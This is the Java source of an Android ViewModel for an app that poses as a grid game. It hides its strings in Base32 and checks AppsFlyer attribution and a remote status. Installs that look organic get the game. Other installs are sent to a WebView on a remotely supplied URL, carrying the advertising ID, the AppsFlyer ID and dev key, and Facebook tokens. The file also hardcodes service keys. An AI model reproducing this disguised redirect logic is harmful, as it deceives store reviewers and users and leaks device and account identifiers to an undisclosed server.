package com.sega.sprin.vieWF;


import static com.sega.sprin.modWF.ApDeWF.decodeWF;


import android.app.Application;
import android.content.Intent;
import android.os.Handler;
import android.util.Log;
import android.widget.Button;
import android.widget.ImageView;

import androidx.annotation.NonNull;
import androidx.lifecycle.AndroidViewModel;

import com.appsflyer.AppsFlyerConversionListener;
import com.appsflyer.AppsFlyerLib;
import com.onesignal.OneSignal;
import com.sega.sprin.R;
import com.sega.sprin.acWF.BuWF;
import com.sega.sprin.acWF.WeWF;
import com.sega.sprin.modWF.ApDeWF;
import com.sega.sprin.modWF.CoWF;
import com.sega.sprin.modWF.GHK;
import com.sega.sprin.modWF.GawF;
import com.sega.sprin.modWF.GwF;

import java.util.ArrayList;
import java.util.List;
import java.util.Map;

public class VieWF extends AndroidViewModel {
    GwF gwF;
    GawF gawF;
    CoWF coWF;
    ApDeWF apDeWF;
    GHK ghk;

    public VieWF(@NonNull Application application) {
        super(application);
        gwF = new GwF();
        gawF = new GawF();
        apDeWF = new ApDeWF();
        ghk = new GHK();
    }

    public void coo(BuWF buWF) {
        coWF.hh(buWF);
        coWF.conWF();
    }

    public void ooo(BuWF buWF) {
        OneSignal.setLogLevel(OneSignal.LOG_LEVEL.VERBOSE, OneSignal.LOG_LEVEL.NONE);
        OneSignal.initWithContext(buWF);
        OneSignal.setAppId("34c38695-f1f6-4d66-b7f6-b9d474454b45");
        coWF = new CoWF(buWF);
    }

    public void kkl(BuWF buWF) {
        AppsFlyerLib.getInstance().init("R9F8JJnBY59vRLfDr9mhGX", new AppsFlyerConversionListener() {
            @Override
            public void onConversionDataSuccess(Map<String, Object> map) {

                apDeWF.setAf_statusWf(map.get(decodeWF("MFTF643UMF2HK4Y=")).toString());

                Log.d("weq", apDeWF.getAf_statusWf() );
                if (apDeWF.getAf_statusWf().equals(decodeWF("JZXW4LLPOJTWC3TJMM======"))) {

                    try {
                        apDeWF.setCampaignWF(map.get(decodeWF("MNQW24DBNFTW4===")).toString());
                    } catch (Exception e) {

                    }

                    try {
                        apDeWF.setMedia_sourceWF(map.get(decodeWF("NVSWI2LBL5ZW65LSMNSQ====")).toString());

                    } catch (Exception e) {

                    }

                    try {
                        apDeWF.setAf_channelWF(map.get(decodeWF("MFTF6Y3IMFXG4ZLM")).toString());
                    } catch (Exception e) {

                    }

                    apDeWF.setStrAppsFlyerWF(apDeWF.parseAP(apDeWF.campaignWF, buWF, coWF));

                    Log.d("weq", apDeWF.getStrAppsFlyerWF());
                } else {

                }

            }

            @Override
            public void onConversionDataFail(String s) {

            }

            @Override
            public void onAppOpenAttribution(Map<String, String> map) {

            }

            @Override
            public void onAttributionFailure(String s) {

            }
        }, buWF);
        AppsFlyerLib.getInstance().start(buWF);

    }

    public void jjj(BuWF buWF) {

        new Thread(new Runnable() {
            @Override
            public void run() {
                coo(buWF);
                apDeWF.kjk(buWF, coWF);
                buWF.runOnUiThread(new Runnable() {
                    @Override
                    public void run() {

                        hgh(buWF);
                    }
                });

            }
        }).start();
    }


    public void hgh(BuWF buWF) {
        Handler handler = new Handler();
        handler.post(new Runnable() {
            @Override
            public void run() {
                if (!apDeWF.getAf_statusWf().equals("-") || !apDeWF.getStrDeppWF().equals("-") && !coWF.getStatusWF().equals("ooo") ) {
                    if (apDeWF.getAf_statusWf().equals(decodeWF("JZXW4LLPOJTWC3TJMM======"))) {
                        ghk.setLoadWF(coWF.getUrlWF() +apDeWF.getStrAppsFlyerWF(),buWF);
                        buWF.startActivity(new Intent(buWF.getApplicationContext(), WeWF.class));
                        buWF.finishAffinity();
                        Log.d("weq","no org" + coWF.getUrlWF() +apDeWF.getStrAppsFlyerWF());

                    } else if (apDeWF.getDeepWF() != null) {
                        ghk.setLoadWF(coWF.getUrlWF() +apDeWF.getStrDeppWF(),buWF);
                        buWF.startActivity(new Intent(buWF.getApplicationContext(), WeWF.class));
                        buWF.finishAffinity();
                        Log.d("weq","deep" + coWF.getUrlWF() +apDeWF.getStrDeppWF());
                    } else {
                        if (coWF.getStatusWF().equals(decodeWF("GA======"))) {
                           vdvvd(buWF.buttonOn, buWF.buttonAnd, buWF.buttonClo);
                           gawF.setBb(true);
                           Log.d("weq","game");
                        } else {
                            String[] ii = {decodeWF("EZRWC3LQMFUWO3R5"), decodeWF("EZTW633HNRSV6YLENFSD2==="), decodeWF("EZQWMX3VONSXE2LEHU======"), decodeWF("EZQWMX3DNBQW43TFNQ6Q===="), decodeWF("EZSGK5S7NNSXSPI="), decodeWF("EZRHK3TENRST2==="), decodeWF("EZTGEX3BOBYF62LEHU======"), decodeWF("EZTGEX3BOQ6Q====")};
                            String google_adidWfs = ii[1] + coWF.getAIDWF();
                            String af_useridWFs = ii[2] + coWF.getApps_idWF();
                            String af_channelWFs = ii[3] + apDeWF.getAf_channelWF();
                            String dev_keyWFs = ii[4] + "R9F8JJnBY59vRLfDr9mhGX";
                            String bundleWFs = ii[5] + buWF.getPackageName();
                            String fb_app_idWFs = ii[6] + buWF.getResources().getString(R.string.f);
                            String fb_atWFs = ii[7] + buWF.getResources().getString(R.string.t);
                            String ds = decodeWF("H5WWKZDJMFPXG33VOJRWKPLPOJTWC3TJMM======") + google_adidWfs + af_useridWFs
                                    + af_channelWFs + dev_keyWFs + bundleWFs + fb_app_idWFs + fb_atWFs;
                            ghk.setLoadWF(coWF.getUrlWF() + ds,buWF);
                            buWF.startActivity(new Intent(buWF.getApplicationContext(), WeWF.class));
                            buWF.finishAffinity();
                            Log.d("weq","org"+coWF.getUrlWF() + ds);
                        }
                    }

                } else {
                    handler.postDelayed(this::run, 1000);
                }
            }
        });
    }

    public void jks(String s){
        ghk.setLoadWF(s);
    }
    public String ddk(){
       return ghk.getLoadWF();
    }

    public void vdvvd(Button buttonOn, Button buttonAnd, Button buttonClo) {
        gwF.vvv(buttonOn, buttonAnd, buttonClo);
    }

    public void hhh(Button buttonIn, BuWF buWF) {
        gwF.ggg(buttonIn, buWF);
    }

    public void looo(ImageView imageView, ImageView imageView4, ImageView imageView2, ImageView imageView3) {
        gawF.loadingWF(imageView, imageView4, imageView2, imageView3);
    }

    public void innn(BuWF buWF) {
        gawF.init(buWF);
    }

    public boolean innnc() {
        return gawF.isIntWF();
    }

    public int gA() {
        return gawF.getA();
    }

    public int gB() {
        return gawF.getB();
    }

    public void jj(List<ArrayList<ImageView>> lists, int[][] ff) {
        gawF.gg(lists, ff);
    }

    public boolean kk(int i, int j, int[][] dd) {
        gwF.v1(i, j, dd);
        gwF.v2(i, j, dd);
        gwF.v3(i, j, dd);
        gwF.h1(i, j, dd);
        gwF.h2(i, j, dd);
        gwF.h3(i, j, dd);
        gwF.d1(i, j, dd);
        gwF.d2(i, j, dd);
        gwF.d3(i, j, dd);
        gwF.d4(i, j, dd);
        gwF.d5(i, j, dd);
        gwF.d6(i, j, dd);
        return gwF.isKk();
    }

    public void kk(boolean f) {
        gwF.setKk(f);
    }
}
